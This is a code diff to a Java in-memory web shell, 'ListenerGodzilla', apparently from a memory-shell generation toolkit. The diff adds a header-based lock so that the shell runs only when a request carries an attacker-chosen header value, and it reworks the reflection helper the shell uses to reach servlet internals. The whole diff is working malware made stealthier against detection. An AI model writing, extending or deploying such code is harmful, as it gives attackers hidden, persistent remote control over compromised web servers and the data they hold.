@@ -15,11 +15,13 @@ import java.net.URLClassLoader;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Godzilla)
-@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass})
+@JavaClassModifiable({JavaClassModifiable.key, JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ListenerGodzilla implements InvocationHandler {
     public static String key; // key
     public static String pass;
     public static String md5 = md5(pass + key);
+    private String lockHeaderKey;
+    private String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
@@ -43,6 +45,9 @@ public class ListenerGodzilla implements InvocationHandler {
     public void run(Object sre) {
         try {
             Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+            if(!((String)invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+                return;
+            }
             Object session = invokeMethod(httpServletRequest, "getSession", new Class[]{}, new Object[]{});
 
             Object response = getResponse(httpServletRequest);
@@ -154,13 +159,17 @@ public class ListenerGodzilla implements InvocationHandler {
     }
 
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
         try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
+    }
+
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
-        return method.invoke(obj, args);
+        Object object = method.invoke(obj, args);
+        return object;
     }
 }
